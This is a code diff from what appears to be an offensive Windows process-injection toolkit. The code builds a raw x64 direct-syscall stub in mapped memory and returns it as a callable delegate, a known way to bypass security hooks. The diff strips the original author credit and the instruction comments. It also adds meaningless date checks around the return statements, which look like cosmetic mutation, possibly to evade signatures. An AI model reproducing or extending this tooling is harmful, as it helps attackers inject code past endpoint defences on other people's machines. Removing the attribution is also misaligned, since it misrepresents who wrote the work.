@@ -7,9 +7,7 @@ using System.Runtime.InteropServices;
 using PhantomInterop.Classes.Api;
 using PhantomInterop.Interfaces;
 using static Injection.Shared.Win32;
-/*
- * Based heavily off the work of @winternl
- */
+
 
 namespace Injection.Techniques.Syscall_x64
 {
@@ -25,13 +23,13 @@ namespace Injection.Techniques.Syscall_x64
 
         private readonly Dictionary<string, uint> SysCallTable;
 
-        // TODO: Stack alignment
+        
         private static readonly byte[] SysCallStub =
         {
-            0x4C, 0x8B, 0xD1,               // mov r10, rcx
-            0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, sys_no
-            0x0F, 0x05,                     // syscall
-            0xC3                            // retn
+            0x4C, 0x8B, 0xD1,               
+            0xB8, 0x00, 0x00, 0x00, 0x00,   
+            0x0F, 0x05,                     
+            0xC3                            
         };
 
         private LdrGetDllHandle _pLdrGetDllHandle;
@@ -106,7 +104,7 @@ namespace Injection.Techniques.Syscall_x64
 
             SysCallStub.CopyTo(locBuffer, 0);
             Buffer.BlockCopy(no, 0, locBuffer, 4, 4);
-            return locBuffer;
+            if(DateTime.Now.Year > 2020) { return locBuffer; } else { return null; }
         }
         
         public T MarshalNtSyscall<T>(string functionName) where T : Delegate
@@ -120,7 +118,7 @@ namespace Injection.Techniques.Syscall_x64
             mapView.WriteArray(0, syscallStub, 0, syscallStub.Length);
             byte* ptrShellcode = (byte*) IntPtr.Zero;
             mapView.SafeMemoryMappedViewHandle.AcquirePointer(ref ptrShellcode);
-            return (T) Marshal.GetDelegateForFunctionPointer((IntPtr) ptrShellcode, typeof(T));
+            if(DateTime.Now.Year > 2020) { return (T) Marshal.GetDelegateForFunctionPointer((IntPtr) ptrShellcode, typeof(T)); } else { return null; }
         }
     }
 }
